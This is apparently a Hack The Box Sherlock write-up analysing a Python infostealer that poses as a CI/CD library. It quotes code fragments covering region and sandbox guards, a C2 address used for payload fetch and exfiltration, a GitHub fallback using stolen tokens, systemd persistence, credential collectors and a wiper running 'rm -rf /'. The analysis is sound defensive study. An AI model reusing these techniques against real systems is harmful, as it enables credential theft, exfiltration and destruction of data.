
# TeamPCP

### Scenario

Your threat-hunting team extracted a suspicious Python package from a compromised developer workstation during an active cloud breach investigation. The package masquerades as a legitimate CI/CD helper library but is in fact a full-featured, multi-stage infostealer.
| Field | Details |
| --- | --- |
| Platform | [Hack The Box — Sherlocks](https://app.hackthebox.com/sherlocks/TeamPCP) |
| Difficulty | Easy |
| Category | Malware Analysis |
| Tools | Static Python source inspection |
| Author | dmncdcco |

## Overview

The suspicious package presents itself as a CI/CD helper library. Its source contains environment checks, credential collectors, encrypted data transfers and a secondary payload handler.

The analysis follows the code without executing the package. The main files are `__main__.py`, `entrypoint.py`, `roulette.py` and the modules under `collectors/` and `utilities/`.

## Tasks

### Task 1 — Operating System Check

**Question:** What exact string does the script compare sys.platform against?

- **Answer:** `linux`

- The first guard in `__main__.py` is:

```python
if sys.platform not in ('linux'):
    sys.exit(1)
```

- On a normal Linux installation, `sys.platform` returns `linux`, allowing execution to continue. There is a small implementation detail: `('linux')` is a string, not a tuple. The expression therefore performs substring membership rather than comparing against a one-element tuple.

### Task 2 — Excluded Locale Prefix

**Question:** What two-character prefix causes the script to exit when found at the beginning of LANG?

- **Answer:** `ru`

- The script reads `LANG`, removes the encoding suffix and checks its lowercase value:

```python
    lang = os.environ.get('LANG', '').split('.')[0]
    if lang.lower().startswith('ru'):
        sys.exit(1)
```

- For example, `ru_RU.UTF-8` becomes `ru_RU` and matches the prefix. This is an execution filter based on locale. It does not establish the operator’s identity or nationality.

### Task 3 — CPU Threshold

**Question:** What integer value is used as the CPU threshold?

- **Answer:** `4`

- The next guard checks the CPU count:

```python
if os.cpu_count() is None or os.cpu_count() <= 4:
    sys.exit(1)
```

- Execution stops if the count is unavailable or is four or fewer. The package therefore requires a reported count greater than four to pass this check.

### Task 4 — Activation Marker

**Question:** What is the full absolute path of the two-stage activation marker?

- **Answer:** `/tmp/.transformers`

- The marker is defined in `__main__.py`:

```python
INIT_MARKER = Path('/tmp/.transformers')
```

- When the package runs as the main module, it checks for that file:

```python
    if not INIT_MARKER.exists():
        try:
            INIT_MARKER.touch()
        except Exception:
            pass
        sys.exit(1)
```

- If the marker is absent, the script attempts to create it and exits. On a later run, an existing marker allows execution to proceed to the next stage.

### Task 5 — Primary C2 Address

**Question:** What IP address is shared by the two hardcoded C2 URLs?

- **Answer:** `83.142.209.194`

- `entrypoint.py` defines two endpoints:

```python
_EARLY_QUARANTINE_URL = "https://83.142.209.194/v1/models"
_TARGET_URL = "https://83.142.209.194/v1/weights"
```

- The first endpoint is contacted before credential collection. A successful HTTP 200 response is read and passed to `roulette.collect()` as a Base64 payload. The second endpoint is the default destination for the packaged collection results.

### Task 6 — GitHub Fallback Keyword

**Question:** What uppercase keyword identifies fallback C2 information in GitHub commit messages?

- **Answer:** `FIRESCALE`

- The parser uses this regular expression:

```python
_FIRESCALE_RE = re.compile(r'FIRESCALE\s+([A-Za-z0-9+/=]+)\.([A-Za-z0-9+/=]+)')
```

- The resolver searches public GitHub commits for `FIRESCALE`. Matching messages contain a Base64-encoded URL and a signature separated by a dot. Before accepting the decoded URL, the code verifies the signature over the encoded URL string:

```python
            if rsa_verify_sha256(_PUBLIC_KEY_PEM, b64_url.encode(), sig_bytes):
                return url_bytes.decode().strip()
```

- This lets the operator publish a replacement destination without changing the address embedded in the package.

### Task 7 — Repository Naming Word

**Question:** What is the first word in the hardcoded repository naming list?

- **Answer:** `BABA-YAGA`

- Inside `upload_to_github()`, the list begins with:

```python
    wordy_words = [
        "BABA-YAGA", "KOSCHEI", "FIREBIRD", "PTITSA", "TSAREVICH",
        "VASSILISA", "LESHY", "DOMOVOI", "RUSALKA", "SAMOVAR",
```

- The repository name combines two randomly selected list entries with a three-digit number:

```python
    repo_name = f"{random.choice(wordy_words)}-{random.choice(wordy_words)}-{random.randint(100, 999)}"
```

- If the normal upload fails and a GitHub token is found in the collected data, the code attempts to create a public repository and upload `results.json`.

### Task 8 — Compression Module

**Question:** Which standard Python library module compresses the collected data before encryption?

- **Answer:** `gzip`

- The first operation in `_build_package()` serializes the results to JSON, encodes them as bytes and compresses them:

```python
    compressed = gzip.compress(json.dumps(data).encode())
```

- Compression occurs before the encryption step.

### Task 9 — Symmetric Encryption

**Question:** What symmetric algorithm, key size and mode protect the compressed data?

- **Answer:** `AES-256-GCM`

- `entrypoint.py` generates a 32-byte session key and a 12-byte initialization vector:

```python
    aes_key = os.urandom(32)
    iv = os.urandom(12)
```

- A 32-byte key contains 256 bits. The implementation in `utilities/crypto.py` confirms AES in GCM mode:

```python
def aes_256_gcm_encrypt(key: bytes, iv: bytes, plaintext: bytes) -> tuple[bytes, bytes]:
    encryptor = Cipher(algorithms.AES(key), modes.GCM(iv)).encryptor()
    ciphertext = encryptor.update(plaintext) + encryptor.finalize()
    return ciphertext, encryptor.tag
```

- The function returns the ciphertext and its authentication tag.

### Task 10 — Session Key Encryption

**Question:** What asymmetric scheme, padding and hash algorithm encrypt the AES session key?

- **Answer:** `RSA-OAEP-SHA256`

- The key-wrapping function uses RSA with OAEP padding:

```python
def rsa_oaep_encrypt_sha256(pem_pubkey: bytes, plaintext: bytes) -> bytes:
    public_key = load_pem_public_key(pem_pubkey)
    return public_key.encrypt(
        plaintext,
        padding.OAEP(
            mgf=padding.MGF1(algorithm=hashes.SHA256()),
            algorithm=hashes.SHA256(),
            label=None
        )
    )
```

- SHA-256 is specified for both OAEP and its MGF1 mask generation function. The collected data is encrypted with AES; RSA protects the AES session key.

### Task 11 — Systemd Unit Filename

**Question:** What is the exact filename of the systemd unit file created by the persistence function?

- **Answer:** `pgsql-monitor.service`

- In `roulette.py`, `deploy_local()` constructs the service path:

```python
    svc_path = os.path.join(svc_dir, "pgsql-monitor.service")
```

- Root execution uses `/etc/systemd/system`; non-root execution uses `~/.config/systemd/user`. The unit describes itself as **PostgreSQL Monitor** and requests automatic restart.

- However, its activation command references an undefined variable:

```python
        subprocess.run(f"{svc_cmd} enable --now {CONFIG['SVC_NAME']}", shell=True)
```

- The supplied module does not define `CONFIG`. This causes an exception before that command launches, and the exception is silently caught. Writing the service file does not establish successful persistence.

### Task 12 — Dropped Python Filename

**Question:** What filename is used for the downloaded payload?

- **Answer:** `pgmonitor.py`

- The same function constructs the payload path:

```python
    bin_path = os.path.join(bin_dir, "pgmonitor.py")
```

- It decodes the received Base64 data, writes it to that path and attempts to set its permissions:

```python
        with open(bin_path, "wb") as f:
            f.write(base64.b64decode(python_b64))
        os.chmod(bin_path, 0o755)
```

- Root execution uses `/usr/bin`; non-root execution uses `~/.local/bin`.

### Task 13 — Wiper Die Roll

**Question:** What integer must the random die roll match to trigger the wiper branch?

- **Answer:** `2`

- The condition appears in `roulette.collect()`:

```python
    roll = random.randint(1, 6)
    if _is_israeli_system() and roll == 2:
```

- Both conditions must hold: the environment must match the region checks and the random roll must equal two. Despite the helper’s name, the checks include markers associated with both Israel and Iran:

```python
    _TZ_MARKERS = ("Jerusalem", "Tel_Aviv", "Tehran")
    _LOCALE_MARKERS = ("he_IL", "fa_IR")
```

### Task 14 — Destructive Command

**Question:** What is the full command string used by the wiper branch?

- **Answer:** `rm -rf /`

- The source passes the command as an argument list:

```python
        subprocess.run(["rm", "-rf", "/"])
```

- Joining those arguments with spaces gives the requested answer. This is an attempted recursive deletion of the root directory. Its success depends on the execution environment, permissions and the installed `rm` implementation. Implementations with root-preservation protection can reject this exact invocation.

### Task 15 — Password Manager Keys

**Question:** List the four dictionary keys returned by collectors/passwords.py, in order.

- **Answer:** `onepassword,bitwarden,pass,gopass`

- The return statement preserves the requested order:

```python
def collect() -> dict:
    return {
        "onepassword": _collect_onepassword(),
        "bitwarden":   _collect_bitwarden(),
        "pass":        _collect_pass(),
        "gopass":      _collect_gopass(),
    }
```

| Dictionary key | CLI |
| --- | --- |
| `onepassword` | `op` |
| `bitwarden` | `bw` |
| `pass` | `pass` |
| `gopass` | `gopass` |

- Collection depends on the installed tools and their available authentication state. For example, the Bitwarden collector checks that the vault is unlocked before requesting its items.

## How the Package Works

### 1. Filter the environment and require a second run

`__main__.py` checks the platform, locale and CPU count. It then uses `/tmp/.transformers` to separate initial activation from subsequent execution. After the marker check passes, the code ensures that `cryptography` is available and launches `entrypoint` while suppressing standard output and errors.

<details>
<summary>View code</summary>

```python
            with open(os.devnull, 'w') as fnull:
                with redirect_stdout(fnull), redirect_stderr(fnull):
                    runpy.run_module('entrypoint', run_name='__main__')
```

</details>

### 2. Request a secondary payload

The entry point first contacts `/v1/models`. An HTTP 200 response is passed to `roulette.collect()`, which selects between the conditional destructive branch and local payload deployment. If an exception occurs during this initial stage, the code attempts to resolve a replacement destination through GitHub.

<details>
<summary>View code</summary>

```python
        with urllib.request.urlopen(req, context=ssl_ctx, timeout=5) as res:
            if res.status == 200:
                payload_b64 = res.read().decode().strip()
                roulette.collect(payload_b64)
    except Exception:
        mothership_url = _resolve_mothership_via_github()
```

</details>

### 3. Run the credential collectors

`aggregate.py` discovers modules under `collectors/` and submits them to a thread pool. Each module’s `collect()` function contributes to the results dictionary. The package includes collectors for AWS, Azure, GCP, Kubernetes, Vault, local files and password managers.

<details>
<summary>View code</summary>

```python
def collect_all() -> dict:
    modules = list(pkgutil.iter_modules(collectors.__path__))

    results = {}
    with concurrent.futures.ThreadPoolExecutor() as executor:
        futures = {executor.submit(run_collector, mod): mod.name for mod in modules}
        for future in concurrent.futures.as_completed(futures):
            name, result = future.result()
            results[name] = result
    return results
```

</details>

### 4. Compress and encrypt the results

The results are serialized and gzip-compressed. A fresh AES key encrypts the compressed data, while the embedded RSA public key encrypts the session key. The returned package contains a Base64 envelope and a separately encoded encrypted key.

<details>
<summary>View code</summary>

```python
def _build_package(data: dict) -> dict:
    compressed = gzip.compress(json.dumps(data).encode())
    aes_key = os.urandom(32)
    iv = os.urandom(12)
    encrypted_key = rsa_oaep_encrypt_sha256(_PUBLIC_KEY_PEM, aes_key)
    ciphertext, tag = aes_256_gcm_encrypt(aes_key, iv, compressed)
    return {
        "envelope": base64.b64encode(iv + ciphertext + tag).decode(),
        "key": base64.b64encode(encrypted_key).decode(),
    }
```

</details>

### 5. Attempt exfiltration, then fall back to GitHub

The code first attempts to send the encrypted package to the selected destination. If that fails, it searches the collected results for a GitHub token. A matching token enables a second attempt using a public repository. This branch uploads the original results as JSON through GitHub’s Base64 content field; it does not use the AES-encrypted package.

<details>
<summary>View code</summary>

```python
        results = collect_all()
        try:
            _send(results, mothership_url)
        except Exception:
            token = find_github_token(results)
            if token:
                upload_to_github(token, results)
```

</details>

The source shows credential theft, multiple exfiltration paths and attempted persistence, alongside a conditional destructive branch. The undefined service configuration and environment-dependent deletion behavior are practical limits when assessing what this particular sample would successfully execute.

---

*This write-up is intended for educational purposes and authorized security research.*
